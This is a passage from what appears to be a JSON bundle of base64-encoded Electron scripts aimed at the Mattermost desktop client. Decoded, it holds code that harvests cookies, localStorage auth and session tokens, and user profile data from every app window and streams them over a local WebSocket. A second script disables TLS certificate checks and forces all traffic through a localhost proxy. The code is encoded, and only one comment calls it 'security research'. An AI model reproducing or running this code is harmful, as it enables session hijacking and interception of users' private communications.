i5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCFkZWZhdWx0U2Vzc2lvbikgcmV0dXJuOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBFeGVjdXRlIHNjcmlwdCB0byBleHRyYWN0IGxvY2FsIHN0b3JhZ2UgaW4gbWFpbiBjb250ZXh0CiAgICAgICAgICAgICAgICBjb25zdCB7IEJyb3dzZXJXaW5kb3cgfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgICAgICBjb25zdCB3aW5kb3dzID0gQnJvd3NlcldpbmRvdy5nZXRBbGxXaW5kb3dzKCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciAoY29uc3Qgd2luIG9mIHdpbmRvd3MpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdpbi53ZWJDb250ZW50cykgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gZXh0cmFjdCBkb2N1bWVudC5jb29raWUKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRvY3VtZW50Q29va2llcyA9IGF3YWl0IHdpbi53ZWJDb250ZW50cy5leGVjdXRlSmF2YVNjcmlwdCgnZG9jdW1lbnQuY29va2llJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnRDb29raWVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdkb2N1bWVudF9jb29raWVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93SWQ6IHdpbi5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB3aW4ud2ViQ29udGVudHMuZ2V0VVJMKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXM6IGRvY3VtZW50Q29va2llcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gSWdub3JlIGVycm9ycwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gZ2V0IG9yaWdpbiBpbmZvcm1hdGlvbgogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgb3JpZ2luID0gYXdhaXQgd2luLndlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KCd3aW5kb3cubG9jYXRpb24ub3JpZ2luJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnb3JpZ2luJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogd2luLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yaWdpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgZXJyb3JzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IGNhdGNoICh3aW5FcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gU2tpcCBvbiBlcnJvcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBsb2NhbFN0b3JhZ2UgZXh0cmFjdGlvbiBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEV4dHJhY3QgTWF0dGVybW9zdC1zcGVjaWZpYyBkYXRhCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZXh0cmFjdE1hdHRlcm1vc3REYXRhKHNvY2tldCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgeyBCcm93c2VyV2luZG93IH0gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgICAgICAgICAgY29uc3Qgd2luZG93cyA9IEJyb3dzZXJXaW5kb3cuZ2V0QWxsV2luZG93cygpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IHdpbiBvZiB3aW5kb3dzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCF3aW4ud2ViQ29udGVudHMpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIExvb2sgZm9yIE1hdHRlcm1vc3Qtc3BlY2lmaWMgZGF0YSBpbiB0aGUgd2luZG93IGNvbnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgbWF0dGVybW9zdERhdGEgPSBhd2FpdCB3aW4ud2ViQ29udGVudHMuZXhlY3V0ZUphdmFTY3JpcHQoYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kOiBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RvcmU6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dGg6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXI6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlYW1zOiBudWxsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsczogbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gQ2hlY2sgZm9yIE1hdHRlcm1vc3QgZ2xvYmFsIG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93Lm1tX2NvbmZpZykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmZvdW5kID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5tbV9jb25maWcgPSB3aW5kb3cubW1fY29uZmlnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93Lm1tX2N1cnJlbnRfdXNlcl9pZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmZvdW5kID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5tbV9jdXJyZW50X3VzZXJfaWQgPSB3aW5kb3cubW1fY3VycmVudF91c2VyX2lkOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBmb3IgUmVkdXggc3RvcmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LnN0b3JlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuZm91bmQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhdGUgPSB3aW5kb3cuc3RvcmUuZ2V0U3RhdGUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3QgYXV0aGVudGljYXRpb24gZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcyAmJiBzdGF0ZS5lbnRpdGllcy51c2VycykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmF1dGggPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50VXNlcklkOiBzdGF0ZS5lbnRpdGllcy51c2Vycy5jdXJyZW50VXNlcklkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvZmlsZXM6IHN0YXRlLmVudGl0aWVzLnVzZXJzLnByb2ZpbGVzID8gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXMpLmxlbmd0aCA6IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcy51c2Vycy5jdXJyZW50VXNlcklkICYmIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1cnJlbnRVc2VyID0gc3RhdGUuZW50aXRpZXMudXNlcnMucHJvZmlsZXNbc3RhdGUuZW50aXRpZXMudXNlcnMuY3VycmVudFVzZXJJZF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudFVzZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnVzZXIgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBjdXJyZW50VXNlci5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWU6IGN1cnJlbnRVc2VyLnVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbWFpbDogY3VycmVudFVzZXIuZW1haWwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvbGVzOiBjdXJyZW50VXNlci5yb2xlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCB0ZWFtIGRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RhdGUuZW50aXRpZXMgJiYgc3RhdGUuZW50aXRpZXMudGVhbXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS50ZWFtcyA9IE9iamVjdC5rZXlzKHN0YXRlLmVudGl0aWVzLnRlYW1zLnRlYW1zIHx8IHt9KS5tYXAoaWQgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGVhbSA9IHN0YXRlLmVudGl0aWVzLnRlYW1zLnRlYW1zW2lkXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IHRlYW0uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogdGVhbS5uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlfbmFtZTogdGVhbS5kaXNwbGF5X25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBFeHRyYWN0IGNoYW5uZWwgZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0ZS5lbnRpdGllcyAmJiBzdGF0ZS5lbnRpdGllcy5jaGFubmVscykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmNoYW5uZWxzID0gT2JqZWN0LmtleXMoc3RhdGUuZW50aXRpZXMuY2hhbm5lbHMuY2hhbm5lbHMgfHwge30pLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuc3RvcmVFcnJvciA9IGUubWVzc2FnZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBmb3IgYXV0aCB0b2tlbnMgaW4gbG9jYWxTdG9yYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gVGhpcyBpcyB0aGUgbW9zdCBpbXBvcnRhbnQgcGFydCBmb3Igc2VjdXJpdHkgcmVzZWFyY2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnRva2VucyA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbG9jYWxTdG9yYWdlLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBsb2NhbFN0b3JhZ2Uua2V5KGkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGtleS5pbmNsdWRlcygndG9rZW4nKSB8fCBrZXkuaW5jbHVkZXMoJ2F1dGgnKSB8fCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXkuaW5jbHVkZXMoJ3Nlc3Npb24nKSB8fCBrZXkuaW5jbHVkZXMoJ21hdHRlcm1vc3QnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEudG9rZW5zW2tleV0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShrZXkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnRva2VuRXJyb3IgPSBlLm1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgYCk7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiAobWF0dGVybW9zdERhdGEgJiYgbWF0dGVybW9zdERhdGEuZm91bmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdtYXR0ZXJtb3N0X2RhdGEnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvd0lkOiB3aW4uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogbWF0dGVybW9zdERhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gTWF0dGVybW9zdCBkYXRhIGV4dHJhY3Rpb24gZXJyb3I6JywgZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIE1hdHRlcm1vc3QgZXh0cmFjdGlvbiBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEV4dHJhY3QgbmV0d29yayBjb25uZWN0aW9ucyBhbmQgcmVxdWVzdHMKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0TmV0d29ya0RhdGEoc29ja2V0KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAvLyBHZXQgYWN0aXZlIGhhbmRsZXMgd2hpY2ggaW5jbHVkZSBuZXR3b3JrIGNvbm5lY3Rpb25zCiAgICAgICAgICAgICAgICBpZiAocHJvY2Vzcy5fZ2V0QWN0aXZlSGFuZGxlcykgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGhhbmRsZXMgPSBwcm9jZXNzLl9nZXRBY3RpdmVIYW5kbGVzKCk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgbmV0SGFuZGxlcyA9IGhhbmRsZXMuZmlsdGVyKGggPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCB0eXBlID0gaC5jb25zdHJ1Y3RvciA/IGguY29uc3RydWN0b3IubmFtZSA6ICd1bmtub3duJzsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHR5cGUuaW5jbHVkZXMoJ1NvY2tldCcpIHx8IHR5cGUuaW5jbHVkZXMoJ1NlcnZlcicpIHx8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZS5pbmNsdWRlcygnQ29ubmVjdGlvbicpIHx8IHR5cGUuaW5jbHVkZXMoJ1JlcXVlc3QnKTsKICAgICAgICAgICAgICAgICAgICB9KS5tYXAoaCA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogaC5jb25zdHJ1Y3RvciA/IGguY29uc3RydWN0b3IubmFtZSA6ICd1bmtub3duJwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBzb2NrZXQgaW5mbwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaC5yZW1vdGVBZGRyZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlbW90ZUFkZHJlc3MgPSBoLnJlbW90ZUFkZHJlc3M7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlbW90ZVBvcnQgPSBoLnJlbW90ZVBvcnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLmxvY2FsQWRkcmVzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mby5sb2NhbEFkZHJlc3MgPSBoLmxvY2FsQWRkcmVzczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8ubG9jYWxQb3J0ID0gaC5sb2NhbFBvcnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3Qgc29ja2V0IHN0YXRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLl9yZWFkYWJsZVN0YXRlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLnJlYWRhYmxlID0gIWguX3JlYWRhYmxlU3RhdGUuZW5kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoLl93cml0YWJsZVN0YXRlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvLndyaXRhYmxlID0gIWguX3dyaXRhYmxlU3RhdGUuZW5kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBpbmZvOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnbmV0d29ya19oYW5kbGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgY291bnQ6IG5ldEhhbmRsZXMubGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVzOiBuZXRIYW5kbGVzCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBHZXQgYWN0aXZlIHJlcXVlc3RzCiAgICAgICAgICAgICAgICBpZiAocHJvY2Vzcy5fZ2V0QWN0aXZlUmVxdWVzdHMpIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCByZXF1ZXN0cyA9IHByb2Nlc3MuX2dldEFjdGl2ZVJlcXVlc3RzKCk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVxSW5mbyA9IHJlcXVlc3RzLm1hcChyID0+ICh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IHIuY29uc3RydWN0b3IgPyByLmNvbnN0cnVjdG9yLm5hbWUgOiAndW5rbm93bicKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdhY3RpdmVfcmVxdWVzdHMnLAogICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogcmVxSW5mby5sZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RzOiByZXFJbmZvCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIE5ldHdvcmsgZGF0YSBleHRyYWN0aW9uIGVycm9yOicsIGVycik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc2VydmVyLmxpc3RlbihQT1JULCAnMTI3LjAuMC4xJywgKCkgPT4gewogICAgICAgICAgICBjb25zb2xlLmxvZyhgW0hFQVAtRVhUUkFDVF0gU2VydmVyIGxpc3RlbmluZyBvbiBodHRwOi8vMTI3LjAuMC4xOiR7UE9SVH1gKTsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtIRUFQLUVYVFJBQ1RdIFdlYlNvY2tldCBlbmRwb2ludDogd3M6Ly8xMjcuMC4wLjE6JHtQT1JUfWApOwogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIHJldHVybiBzZXJ2ZXI7CiAgICB9CiAgICAKICAgIC8vIFN0YXJ0IHNlcnZlciB3aGVuIGFwcCBpcyByZWFkeQogICAgaWYgKGFwcC5pc1JlYWR5KCkpIHsKICAgICAgICBjcmVhdGVTZXJ2ZXIoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgYXBwLndoZW5SZWFkeSgpLnRoZW4oY3JlYXRlU2VydmVyKTsKICAgIH0KICAgIAogICAgY29uc29sZS5sb2coJ1tIRUFQLUVYVFJBQ1RdIERlZXAgaGVhcCBleHRyYWN0aW9uIG1vZHVsZSBpbml0aWFsaXplZCcpOwp9KSgpOwo=","passthrough.js":"","process-hook.js":"","proxy-main.js":"Ly8gTWFpbiBwcm9jZXNzIGhvb2sgdG8gaW5qZWN0IHByZWxvYWQgc2NyaXB0CihmdW5jdGlvbigpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgeyBhcHAsIEJyb3dzZXJXaW5kb3csIHNlc3Npb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgICAgICBjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CgogICAgICAgIC8vIERpc2FibGUgU1NMIHZlcmlmaWNhdGlvbiBmb3IgYWxsIHNlc3Npb25zCiAgICAgICAgYXBwLm9uKCdyZWFkeScsICgpID0+IHsKICAgICAgICAgICAgLy8gRGlzYWJsZSBjZXJ0aWZpY2F0ZSB2ZXJpZmljYXRpb24gZm9yIGFsbCBzZXNzaW9ucwogICAgICAgICAgICBzZXNzaW9uLmRlZmF1bHRTZXNzaW9uLnNldENlcnRpZmljYXRlVmVyaWZ5UHJvYygocmVxdWVzdCwgY2FsbGJhY2spID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIENlcnRpZmljYXRlIHZlcmlmaWNhdGlvbjonLCByZXF1ZXN0Lmhvc3RuYW1lKTsKICAgICAgICAgICAgICAgIC8vIEFsd2F5cyBhY2NlcHQgdGhlIGNlcnRpZmljYXRlCiAgICAgICAgICAgICAgICBjYWxsYmFjaygwKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAvLyBTZXQgdXAgZ2xvYmFsIHByb3h5IHNldHRpbmdzCiAgICAgICAgICAgIHNlc3Npb24uZGVmYXVsdFNlc3Npb24uc2V0UHJveHkoewogICAgICAgICAgICAgICAgbW9kZTogJ2ZpeGVkX3NlcnZlcnMnLAogICAgICAgICAgICAgICAgcHJveHlSdWxlczogJ2h0dHA9bG9jYWxob3N0OjgwODE7aHR0cHM9bG9jYWxob3N0OjgwODEnCiAgICAgICAgICAgIH0sICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIEdsb2JhbCBwcm94eSBzZXR0aW5ncyBhcHBsaWVkJyk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwoKICAgICAgICAvLyBTdG9yZSBvcmlnaW5hbCB